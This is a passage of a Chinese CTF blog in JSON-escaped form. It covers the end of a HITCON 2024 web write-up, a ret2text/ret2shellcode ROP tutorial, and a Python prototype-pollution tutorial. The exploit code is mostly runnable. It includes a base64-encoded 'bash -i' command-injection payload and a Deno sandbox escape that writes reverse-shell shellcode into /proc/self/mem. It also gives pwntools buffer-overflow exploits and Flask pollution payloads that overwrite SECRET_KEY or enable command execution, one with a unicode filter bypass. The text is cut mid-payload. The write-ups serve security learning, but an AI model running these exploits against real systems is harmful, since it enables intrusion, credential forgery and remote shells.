type=\u0026#34;hidden\u0026#34; name=\u0026#34;remote\u0026#34; value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; form.submit(); \u0026lt;/script\u0026gt; \u0026#34;\u0026#34;\u0026#34; flag = \u0026#34;aGl0Y29ue2Vhc3lfcGVhc3lfcmNlX3VzaW5nX2NzcmZfYXR0YWNraW5nX2xvY2FsX3\u0026#34; wordlist = \u0026#34;+/0123456789=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\u0026#34; def foo(c, opt): with open(\u0026#34;exp.html\u0026#34;, \u0026#34;w\u0026#34;) as f: payload = f\u0026#34;[[ $(/readflag|base64) {opt} {flag}{c}* ]] \u0026amp;\u0026amp; sleep 5\u0026#34; payload = base64.b64encode(payload.encode()).decode() payload = f\u0026#34;bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}\u0026#34; f.write(exp1.format(payload)) r = requests.post(url, data={\u0026#34;url\u0026#34;: \u0026#34;https://dev.vincent55.tw\u0026#34;}) with open(\u0026#34;exp.html\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(exp2) start = time.time() requests.post(url, data={\u0026#34;url\u0026#34;: \u0026#34;https://dev.vincent55.tw\u0026#34;}) end = time.time() if end - start \u0026gt; 4: return True return False while True: lb = -1 rb = 65 while lb + 1 \u0026lt; rb: m = (lb + rb) // 2 if foo(wordlist[m], \u0026#34;\u0026gt;\u0026#34;): lb = m else: rb = m flag += wordlist[lb] print(flag) Truth of NPM #\r首先我们看到query.tsx文件中有这么一个函数\nasync function queryPackage(packageName: string) {\rif (cache.has(packageName)) {\rreturn cache.get(packageName) as CachedPackageQueryResult\r}\rconst pkgjson: PackageJson | null = await (async () =\u0026gt; {\rtry {\rconst module = await import(`npm:${packageName}/package.json`, {\rwith: {\rtype: \u0026#39;json\u0026#39;\r}\r})\rreturn module.default\r} catch {\rreturn null\r}\r})()\rif (!pkgjson) {\rconst ps = await asyncMapToArray(walkPackageFiles(npmDir), entry =\u0026gt; Deno.remove(entry.path))\rawait Promise.all(ps)\rreturn null\r}\rlet totalSize = 0\rconst ps = await asyncMapToArray(walkPackageFiles(npmDir), async entry =\u0026gt; {\rconst { size } = await Deno.stat(entry.path)\rtotalSize += size\rreturn Deno.remove(entry.path)\r})\rawait Promise.all(ps)\rconst ret = { size: totalSize, pkgjson }\rcache.set(packageName, ret)\rreturn ret\r} 这里我们可以看到\nconst module = await import(`npm:${packageName}/package.json`, {\rwith: {\rtype: \u0026#39;json\u0026#39;\r}\r}) 这里他会自动import一个包，这个包可以是remote的。 然后在import完之后\nif (!pkgjson) {\rconst ps = await asyncMapToArray(walkPackageFiles(npmDir), entry =\u0026gt; Deno.remove(entry.path))\rawait Promise.all(ps)\rreturn null\r} 他就会删掉原来的你install包中的文件，但是因为这个删除用的是这个函数fs.walk\nasync function* walkPackageFiles(npmDir: string) {\rfor await (const entry of fs.walk(npmDir)) {\rif (entry.isDirectory) continue\r// registry.json is generated by deno\rif (entry.name !== \u0026#39;registry.json\u0026#39;) {\ryield entry\r}\r}\r} 他的特性就是会保留非utf-8编码的文件即tsx文件。 然后在main函数中\nimport { Hono, Context } from \u0026#39;hono\u0026#39;\rimport { rateLimiter } from \u0026#39;./utils.ts\u0026#39;\rconst app = new Hono()\rapp.use(rateLimiter(1))\rapp.use(async (c: Context) =\u0026gt; {\rconst page = c.req.path.slice(1) || \u0026#39;index\u0026#39;\rtry {\rconst { handler } = await import(`./pages/${page}.tsx`)\rreturn handler(c)\r} catch {\rreturn c.html(\u0026#39;404 Not Found\u0026#39;, 404)\r}\r})\rexport default app 你访问你包的名称就会自动import下来，就可以执行命令了，但是我们都是在Deno的沙箱中的，所以我们要执行命令的话要绕一下沙箱 这里具体还没研究透怎么绕的呜呜呜还得花点时间 exp.tsx\nexport const handler = async c-\u0026gt;{\rconst body = await c.req.text()\rreturn c.text(eval(body))\r} exp.js（绕沙箱）\ntry {\rDeno.removeSync(\u0026#39;/tmp/self\u0026#39;)\r} catch {}\rDeno.symlinkSync(\u0026#39;/proc/self\u0026#39;, \u0026#39;/tmp/self\u0026#39;) // bypass https://github.com/denoland/deno/security/advisories/GHSA-23rx-c3g5-hv9w\rconst maps = Deno.readTextFileSync(\u0026#39;/tmp/self/maps\u0026#39;)\rconst first = maps.split(\u0026#39;\\n\u0026#39;).find(x =\u0026gt; x.includes(\u0026#39;deno\u0026#39;))\rconst offset = 0x401c2c0 // p \u0026amp;Builtins_JsonStringify-0x555555554000\rconst base = parseInt(first.split(\u0026#39;-\u0026#39;)[0], 16)\rconst addr = base + offset\rconsole.log(\u0026#39;\u0026amp;Builtins_JsonStringify\u0026#39;, addr.toString(16))\rconst mem = Deno.openSync(\u0026#39;/tmp/self/mem\u0026#39;, {\rwrite: true\r})\r/*\rfrom pwn import *\rcontext.arch = \u0026#39;amd64\u0026#39;\rsc = asm(shellcraft.connect(\u0026#39;127.0.0.1\u0026#39;, 3535, \u0026#39;ipv4\u0026#39;) + shellcraft.dupsh()) print(list(sc))\r*/\rconst shellcode = new Uint8Array([\r106, 41, 88, 106, 2, 95, 106, 1, 94, 153, 15, 5, 72, 137, 197, 72, 184, 1, 1, 1, 1, 1, 1, 1, 2, 80, 72, 184, 3, 1,\r12, 206, 126, 1, 1, 3, 72, 49, 4, 36, 106, 42, 88, 72, 137, 239, 106, 16, 90, 72, 137, 230, 15, 5, 72, 137, 239,\r106, 2, 94, 106, 33, 88, 15, 5, 72, 255, 206, 121, 246, 106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80,\r72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230,\r49, 210, 106, 59, 88, 15, 5\r])\rmem.seekSync(addr, Deno.SeekMode.Start)\rmem.writeSync(shellcode)\rJSON.stringify(\u0026#39;pwned\u0026#39;)\r/*\r1. create a npm package with filename includes invalid utf-8 and publish (tar czf package.tar.gz exppkg \u0026amp;\u0026amp; npm publish package.tar.gz --access public)\r2. curl \u0026#39;http://localhost:8000/query?package=@maple3142/exploit_of_truth_of_npm\u0026#39;\r3. curl --path-as-is \u0026#39;http://localhost:8000/../../deno-dir/npm/registry.npmjs.org/@maple3142/exploit_of_truth_of_npm/0.0.1/exp%ff\u0026#39; -T exp.js\r*/\r// hitcon{the_fix_that_does_not_really_address_the_issue} ","date":"22 July 2024","externalUrl":null,"permalink":"/posts/hitcon2024/","section":"Posts","summary":"","title":"HITCON CTF 2024 web复现","type":"posts"},{"content":"","date":"22 July 2024","externalUrl":null,"permalink":"/tags/wp/","section":"Tags","summary":"","title":"WP","type":"tags"},{"content":"","date":"12 July 2024","externalUrl":null,"permalink":"/categories/pwn/","section":"Categories","summary":"","title":"PWN","type":"categories"},{"content":"","date":"12 July 2024","externalUrl":null,"permalink":"/tags/rop/","section":"Tags","summary":"","title":"ROP","type":"tags"},{"content":"前言 #\r本来在校的时候就把王爽的汇编看完了，然后也看了一点二进制的知识，想着开始学pwn的，结果又是拖了好久，这不暑假才开始，在这里特别感谢一下D1no的Dusk师傅呜呜呜。\n前置知识 #\r在学习这个知识点之前要了解一些东西：\n16进制的运算（虽然说这个比较简单但也是头疼） GDB的简单使用 RET所在位置（x64是在rbp上八个字节，x86是在ebp上面四个字节） 只需要知道这几个以及一些汇编基础就可以开始啦\n（这里所有的溢出都不开启保护）\nRet2text #\r原理： ret2text 即控制程序执行程序本身已有的的代码 (即， .text 段中的代码) 。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。\n这里是拿wiki的题目来做的\n➜ ret2text checksec ret2text\rArch: i386-32-little\rRELRO: Partial RELRO\rStack: No canary found\rNX: NX enabled\rPIE: No PIE (0x8048000) 可以看到有NX但是对栈溢出没什么限制然后我们反编译一下\nint __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\u0026#34;There is something amazing here, do you know anything?\u0026#34;); gets((char *)\u0026amp;v4); printf(\u0026#34;Maybe I will tell you next time !\u0026#34;); return 0; } 这里可以看到V4的地址在rbp-0x64的位置，并且利用了gets这个函数，所以这个时候我们只需要找到存在一个后面的地方就可以进行攻击了\n.text:080485FD secure proc near .text:080485FD .text:080485FD input = dword ptr -10h .text:080485FD secretcode = dword ptr -0Ch .text:080485FD .text:080485FD push ebp .text:080485FE mov ebp, esp .text:08048600 sub esp, 28h .text:08048603 mov dword ptr [esp], 0 ; timer .text:0804860A call _time .text:0804860F mov [esp], eax ; seed .text:08048612 call _srand .text:08048617 call _rand .text:0804861C mov [ebp+secretcode], eax .text:0804861F lea eax, [ebp+input] .text:08048622 mov [esp+4], eax .text:08048626 mov dword ptr [esp], offset unk_8048760 .text:0804862D call ___isoc99_scanf .text:08048632 mov eax, [ebp+input] .text:08048635 cmp eax, [ebp+secretcode] .text:08048638 jnz short locret_8048646 .text:0804863A mov dword ptr [esp], offset command ; \u0026#34;/bin/sh\u0026#34; .text:08048641 call _system 然后可以看到地址0804863A中有一个/bin/sh来执行命令的后门，所以我们只需要让ret跳到这个位置执行命令即可\n那么现在就是要计算一下gets到ebp的相对位置 通过GDB断点调试\n$eax : 0xffffcd5c → 0x08048329 → \u0026#34;__libc_start_main\u0026#34;\r$ebx : 0x00000000\r$ecx : 0xffffffff\r$edx : 0xf7faf870 → 0x00000000\r$esp : 0xffffcd40 → 0xffffcd5c → 0x08048329 → \u0026#34;__libc_start_main\u0026#34;\r$ebp : 0xffffcdc8 → 0x00000000\r$esi : 0xf7fae000 → 0x001b1db0\r$edi : 0xf7fae000 → 0x001b1db0\r$eip : 0x080486ae → \u0026lt;main+102\u0026gt; call 0x8048460 \u0026lt;gets@plt\u0026gt; 可以看到esp和ebp的地址以及s的地址 就可以计算出来ebp和s的相对位置 s 相对于 ebp 的偏移为 0x6c 然后再加上4字节跳到ret进行跳转即可 exp.py\nfrom pwn import * fi = process(\u0026#39;./ret2text\u0026#39;) addr = 0x0804863A #要跳转的地址 playload = b\u0026#39;a\u0026#39;*0x6c+b\u0026#39;b\u0026#39;*0x04+p32(addr) fi.sendline(playload) fi.interacitve() 这样子就可以进行调用sh来获取flag了\nret2shellcode #\r这个漏洞的使用方法和RET2TEXT一模一样，区别就在于他没有内置的后门，需要我们自己去写一个shellcode来进行getshell\n可以看一下这道题\nint __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\u0026#34;No system for you this time !!!\u0026#34;); gets((char *)\u0026amp;v4); strncpy(buf2, (const char *)\u0026amp;v4, 0x64u); printf(\u0026#34;bye bye ~\u0026#34;); return 0; } 这里就做了两个关键的操作就是一个是gets一个是strncpy，他将输入的0x64个字符也就是100个字符复制到了buf2的地址上去，所以我们的思路是这样的： 首先我们还是要先计算gets到ebp的距离，其实就是v4的地址到ebp的距离，然后我们把ret覆盖掉后让他跳到buf2上去，因为我们可以把shellcode复制到buf2上去，然后进行劫持。\n具体如下：（注意一下这里的.bss是有可执行权限的） 然后buf2的地址\n.bss:0804A080 public buf2 .bss:0804A080 ; char buf2[100] 可以看到是0x0804A080 然后s的位置需要GDB自己调试一下，不能直接用0x64+0x04来计算，需要看实际s相对于esp和ebp的距离再计算。这里我就不做示例了网上都有分析的\nexp.py\nfrom pwn import * fi = process(\u0026#39;./ret2shellcode\u0026#39;) addr = 0x0804A080 shellcode = asm(shellcraft.sh())#制作shellcode playload = shellcode.ljust(112,b\u0026#39;A\u0026#39;) + p32(addr) fi.sendline(playload) fi.interactive() 这里的ljust方法就是将其补齐到112个字节，因为我们要到ret的地址上面所以需要补齐。\nreference： https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode 再次感谢Dusk师傅\n","date":"12 July 2024","externalUrl":null,"permalink":"/posts/baserop/","section":"Posts","summary":"","title":"基本ROP","type":"posts"},{"content":"","date":"11 July 2024","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"前言 #\r在研究了Nodejs原型链污染之后，我注意到了国赛中出现的一个知识点Python原型链污染，同时我注意到CTFSHOW上的一个题目，于是我开始学习它并写了这篇简单的文章。\n从Merge开始 #\r我们这里还是从常见的merge函数来做入手举例，因为其实对于原型链污染来说，本质上都是一个东西，只是基于不同的语言特性，某些存在局限性，但是讲到merge大家都应该想到和原型链污染有关。\n这里我就把这个关键的merge的定义放在这里，其实是同nodejs一样的操作\ndef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) 可以看到也是通过键值互换来进行的污染，但是这里要注意在python中的object的属性是不可以被污染的，具体的后面会说。\n一个最简单的实例：\ndef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class ctfer: flag = \u0026#34;flag{fake_flag}\u0026#34; class Delete(ctfer): pass class Chu0(ctfer): pass class Kengwang(ctfer): pass ctf1 = Delete() ctf2 = Chu0() evil_playload = { \u0026#34;__class__\u0026#34;: { \u0026#34;__base__\u0026#34;: { \u0026#34;flag\u0026#34;: \u0026#34;flag{really_flag}\u0026#34; } } } print(ctf1.flag) print(ctf2.flag) merge(evil_playload, ctf1) print(ctf1.flag) print(ctf2.flag) 运行结果，可以看到是被污染的了 然后其他的例如修改内置属性也是ok的这里就不写了。 记住object的属性是无法被污染的`\nmerge(evil_playload,object) print(object) #TypeError: cannot set \u0026#39;flag\u0026#39; attribute of immutable type \u0026#39;object\u0026#39; 可以看到会报错的\nQuestion1 #\r这里就产生了一个问题，我们在上述的写法当中是利用Delete去继承了ctfer这个类的，这样子我们才可以通过基类去污染其属性值，但是如果不存在这个继承关系的时候我们应该如何去污染呢？\n_\\globals__ #\r我们就可以去思索一下关于python的一些问题，例如在SSTI中我们是如何去获取我们可用的属性或者说方法呢？ 应该很直观就能想到，是他——__globals__. __globals__ 是 Python 函数对象的一个属性，它返回包含函数定义时的全局变量的字典。通过这个属性，你可以访问和修改函数定义所在的模块中的全局变量。\nx = 10 # 全局变量 def my_function(): print(x) # 打印全局变量 x def modify_global_var(): my_function.__globals__[\u0026#39;x\u0026#39;] = 20 # 修改全局变量 x my_function() # 输出 10 modify_global_var() my_function() # 输出 20 可以看到实例当中我们通过这个属性来改变了全局变量中的x。\n所以我们就可以这样去构造一下playload\nevil_playload = { \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;flag\u0026#34; : \u0026#34;flag{really_flag}\u0026#34; } } } 这样子就可以去应对于不存在继承链的情况\nQuestion2 #\r我们再想要一个场景，虽然说在一些题目场景来说，大多都是在main.py中去import一个test.py，并且关系比较简单的时候，通常都可以利用上面的方法来进行污染，当关系比较复杂的时候就比较麻烦，例如多层import 或者导入第三方库来导入的时候比较麻烦，这里就提供了几个方法\nModule sys #\r我们这里就可以利用sys来实现。这个应该不用多说了\nmain.py\nimport test1 import sys def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class Test(): def __init__(self): pass evil_playload = { \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;sys\u0026#34;:{ \u0026#34;modules\u0026#34;:{ \u0026#34;test1\u0026#34;:{ \u0026#34;Test1\u0026#34;: { \u0026#34;flag\u0026#34; :\u0026#34;flag{really_flag}\u0026#34; } } } } } } } test = Test() print(test1.Test1.flag) merge(evil_playload,test) print(test1.Test1.flag) test1.py\nclass Test1: flag = \u0026#34;flag{fake_flag}\u0026#34; Loader加载器 #\r我们的sys使用是在题目环境中有给你sys的情况下才会可以使用的，但是如果题目不给你，那么sys基本上也是G了，所以咱们就着手一下其他方面\n为了进一步优化，这里采用方式是利用Python中加载器loader，在官方文档中给出的定义是 也就是加载类的东西。\nabout spec #\r__spec__内置属性在Python 3.4版本引入，其包含了关于类加载时的信息，本身是定义在Lib/importlib/_bootstrap.py的类ModuleSpec，显然因为定义在importlib模块下的py文件，所以可以直接采用\u0026lt;模块名\u0026gt;.__spec__.__init__.__globals__['sys']获取到sys模块\n所以我们就可以利用任意的类来进行加载sys从而达到前面的目的 这里有个demo可以看看‘\nimport math # 获取模块的loader loader = math.__spec__.__init__.__globals__[\u0026#39;sys\u0026#39;] # 打印loader信息 print(loader.modules) # {\u0026#39;sys\u0026#39;: \u0026lt;module \u0026#39;sys\u0026#39; (built-in)\u0026gt;, \u0026#39;builtins\u0026#39;: \u0026lt;module \u0026#39;builtins\u0026#39; (built-in)\u0026gt;, \u0026#39;_frozen_importlib\u0026#39;: \u0026lt;module \u0026#39;_frozen_importlib\u0026#39; (frozen)\u0026gt;, ....... 可以看到我们就可以这么去调用从而去搭配利用打组合拳\n默认值替换 #\r函数形参 #\r主要用到了函数的__defaults__和__kwdefaults__这两个内置属性\n__defaults__ #\r__defaults__ 是 Python 函数对象的一个属性，它包含函数的默认参数值。__defaults__ 返回一个包含默认参数值的元组。如果函数没有默认参数，__defaults__ 返回 None。\n具体的内容可以看这里 python函数的位置参数(Positional)和关键字参数(keyword) - 知乎 (zhihu.com)\n根据文章的最后面，我们可以总结一下(巧记一下)：\n/前面都为仅位置参数 / 后*前都为位置或关键字参数 *后都为仅关键字参数 仅位置参数不可以利用变量名 = 变量赋值，位置或关键字参数可以利用其赋值，也可以不赋值，仅关键词参数必须用变量名=值来赋值 def func_a(var_1, var_2 =2, var_3 = 3): pass def func_b(var_1, /, var_2 =2, var_3 = 3): pass def func_c(var_1, var_2 =2, *, var_3 = 3): pass def func_d(var_1, /, var_2 =2, *, var_3 = 3): pass print(func_a.__defaults__) #(2, 3) print(func_b.__defaults__) #(2, 3) print(func_c.__defaults__) #(2,) print(func_d.__defaults__) #(2,) 所以在污染中可以这样\ndef evil(arg_1 , shell = False): if not shell: print(arg_1) else: print(__import__(\u0026#34;os\u0026#34;).popen(arg_1).read()) evil_playload = { \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;evil\u0026#34;:{ \u0026#34;__defaults__\u0026#34;:{ True, } } } } } 其实也就是我们如果去获取evil函数的defaluts属性的时候就只能获取到位置或关键字参数，所以这里的defaults默认指向的就是shell这个参数，所以就可以进行污染\n__kwdefaluts__ #\r__kwdefaults__以字典的形式按从左到右的顺序收录了函数键值形参的默认值，从代码上来看，则是如下的效果：\ndef func_a(var_1, var_2 =2, var_3 = 3): pass def func_b(var_1, /, var_2 =2, var_3 = 3): pass def func_c(var_1, var_2 =2, *, var_3 = 3): pass def func_d(var_1, /, var_2 =2, *, var_3 = 3): pass print(func_a.__kwdefaults__) #None print(func_b.__kwdefaults__) #None print(func_c.__kwdefaults__) #{\u0026#39;var_3\u0026#39;: 3} print(func_d.__kwdefaults__) #{\u0026#39;var_3\u0026#39;: 3} 可以看到他仅获取了仅关键字参数，并且返回是以字典的形式返回的。\n所以同样的\ndef evil(arg_1 ,*,shell = False): if not shell: print(arg_1) else: print(__import__(\u0026#34;os\u0026#34;).popen(arg_1).read()) evil_payload = { \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;evilFunc\u0026#34; : { \u0026#34;__kwdefaults__\u0026#34; : { \u0026#34;shell\u0026#34; : True } } } } } 这样子就可以进行污染了。\n特定值污染 #\r环境变量污染 #\r在这几天的i春秋的比赛当中出了这么一个赛题\n\u0026lt;?php highlight_file(__FILE__); error_reporting(E_ALL); ini_set(\u0026#39;display_errors\u0026#39;, 1); function filter($a) { $pattern = array(\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;\\(\u0026#39;,\u0026#39;\\)\u0026#39;,\u0026#39;;\u0026#39;,\u0026#39;bash\u0026#39;); $pattern = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $pattern) . \u0026#39;/i\u0026#39;; if(preg_match($pattern,$a)){ die(\u0026#34;No injecting!!!\u0026#34;); } return $a; } class ENV{ public $key; public $value; public $math; public function __toString() { $key=filter($this-\u0026gt;key); $value=filter($this-\u0026gt;value); putenv(\u0026#34;$key=$value\u0026#34;); system(\u0026#34;cat hints.txt\u0026#34;); } public function __wakeup() { if (isset($this-\u0026gt;math-\u0026gt;flag)) { echo getenv(\u0026#34;LD_PRELOAD\u0026#34;); echo \u0026#34;YesYes\u0026#34;; } else { echo \u0026#34;YesYesYes\u0026#34;; } } } class DIFF{ public $callback; public $back; private $flag; public function __isset($arg1) { system(\u0026#34;cat /flag\u0026#34;); $this-\u0026gt;callback-\u0026gt;p; echo \u0026#34;You are stupid, what exactly is your identity?\u0026#34;; } } class FILE{ public $filename; public $enviroment; public function __get($arg1){ if(\u0026#34;hacker\u0026#34;==$this-\u0026gt;enviroment){ echo \u0026#34;Hacker is bad guy!!!\u0026#34;; } } public function __call($function_name,$value) { if (preg_match(\u0026#39;/\\.[^.]*$/\u0026#39;, $this-\u0026gt;filename, $matches)) { $uploadDir = \u0026#34;/tmp/\u0026#34;; $destination = $uploadDir . md5(time()) . $matches[0]; if (!is_dir($uploadDir)) { mkdir($uploadDir, 0755, true); } file_put_contents($this-\u0026gt;filename, base64_decode($value[0])); if (rename($this-\u0026gt;filename, $destination)) { echo \u0026#34;文件成功移动到${destination}\u0026#34;; } else { echo \u0026#39;文件移动失败。\u0026#39;; } } else { echo \u0026#34;非法文件名。\u0026#34;; } } } class FUN{ public $fun; public $value; public function __get($name) { echo \u0026#34;Hacker!aaaaaaaaaaaaa\u0026#34;; $this-\u0026gt;fun-\u0026gt;getflag($this-\u0026gt;value); } } 这个是打php的ld_preload 然后如果说他是利用python来写的题目的话，我们就可以通过污染环境变量来打ld_preload劫持，有些时候说不定还能打出非预期，嘻嘻。\nflask特定属性污染 #\r密钥替换 #\r这里直接贴代码吧，可以造成任意session伪造甚至改变pin码\nfrom flask import Flask,request import json app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) return \u0026#34;[+]Config:%s\u0026#34;%(app.config[\u0026#39;SECRET_KEY\u0026#39;]) app.run(host=\u0026#34;0.0.0.0\u0026#34;) 污染链\n{ \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;app\u0026#34; : { \u0026#34;config\u0026#34; : { \u0026#34;SECRET_KEY\u0026#34; :\u0026#34;Polluted~\u0026#34; } } } } } _got_first_request污染 #\r用于判定是否某次请求为自Flask启动后第一次请求，是Flask.got_first_request函数的返回值，此外还会影响装饰器app.before_first_request的调用，而_got_first_request值为假时才会调用：\nfrom flask import Flask,request import json app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() flag = \u0026#34;Is flag here?\u0026#34; @app.before_first_request def init(): global flag if hasattr(app, \u0026#34;special\u0026#34;) and app.special == \u0026#34;U_Polluted_It\u0026#34;: flag = open(\u0026#34;flag\u0026#34;, \u0026#34;rt\u0026#34;).read() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) global flag setattr(app, \u0026#34;special\u0026#34;, \u0026#34;U_Polluted_It\u0026#34;) return flag app.run(host=\u0026#34;0.0.0.0\u0026#34;) 链子\npayload={ \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;app\u0026#34;:{ \u0026#34;_got_first_request\u0026#34;:False } } } } _static_url_path污染 #\r@app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) return \u0026#34;flag in ./flag but heres only static/index.html\u0026#34; payload={ \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;app\u0026#34;:{ \u0026#34;_static_folder\u0026#34;:\u0026#34;./\u0026#34; } } } } os.path.pardir #\r#app.py from flask import Flask,request import json app = Flask(__name__) def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) class cls(): def __init__(self): pass instance = cls() @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def index(): if request.data: merge(json.loads(request.data), instance) return \u0026#34;flag in ./flag but heres only static/index.html\u0026#34; app.run(host=\u0026#34;0.0.0.0\u0026#34;) 这里是利用特性\npayload={ \u0026#34;__init__\u0026#34;:{ \u0026#34;__globals__\u0026#34;:{ \u0026#34;os\u0026#34;:{ \u0026#34;path\u0026#34;:{ \u0026#34;pardir\u0026#34;:\u0026#34;,\u0026#34; } } } } } SSTI jinja2污染 #\r这里就只贴出恶意链，不具体分析了，其实就是走的ssti的底层，去改掉模板的标识符\n{ \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;app\u0026#34; : { \u0026#34;jinja_env\u0026#34; :{ \u0026#34;variable_start_string\u0026#34; : \u0026#34;[[\u0026#34;,\u0026#34;variable_end_string\u0026#34;:\u0026#34;]]\u0026#34; } } } } 赛题 #\rCTFshow西瓜杯 #\rfrom flask import Flask, session, redirect, url_for,request,render_template import os import hashlib import json import re def generate_random_md5(): random_string = os.urandom(16) md5_hash = hashlib.md5(random_string) return md5_hash.hexdigest() def filter(user_input): blacklisted_patterns = [\u0026#39;init\u0026#39;, \u0026#39;global\u0026#39;, \u0026#39;env\u0026#39;, \u0026#39;app\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;string\u0026#39;] for pattern in blacklisted_patterns: if re.search(pattern, user_input, re.IGNORECASE): return True return False def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) app = Flask(__name__) app.secret_key = generate_random_md5() class evil(): def __init__(self): pass @app.route(\u0026#39;/\u0026#39;,methods=[\u0026#39;POST\u0026#39;]) def index(): username = request.form.get(\u0026#39;username\u0026#39;) password = request.form.get(\u0026#39;password\u0026#39;) session[\u0026#34;username\u0026#34;] = username session[\u0026#34;password\u0026#34;] = password Evil = evil() if request.data: if filter(str(request.data)): return \u0026#34;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~\u0026#34; else: merge(json.loads(request.data), Evil) return \u0026#34;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED\u0026#34; return render_template(\u0026#34;index.html\u0026#34;) @app.route(\u0026#39;/admin\u0026#39;,methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def templates(): username = session.get(\u0026#34;username\u0026#34;, None) password = session.get(\u0026#34;password\u0026#34;, None) if username and password: if username == \u0026#34;adminer\u0026#34; and password == app.secret_key: return render_template(\u0026#34;flag.html\u0026#34;, flag=open(\u0026#34;/flag\u0026#34;, \u0026#34;rt\u0026#34;).read()) else: return \u0026#34;Unauthorized\u0026#34; else: return f\u0026#39;Hello, This is the POLLUTED page.\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) python的原型链污染，需要把app.secret_key污染成一个我们想要的值，接着把 _static_folder的路径污染成服务器的根目录，实现任意文件读取从而得到flag。 因为有waf所以这里就unicode一下\n{ \u0026#34;\\u005F\\u005F\\u0069\\u006E\\u0069\\u0074\\u005F\\u005F\u0026#34;: { \u0026#34;\\u005F\\u005F\\u0067\\u006C\\u006F\\u0062\\u0061\\u006C\\u0073\\u005F\\u005F\u0026#34;: { \u0026#34;\\u0061\\u0070\\u0070\u0026#34;: { \u0026#34;\\u006A\\u0069\\u006E\\u006A\\u0061\\u005F\\u0065\\u006E\\u0076\u0026#34;: { 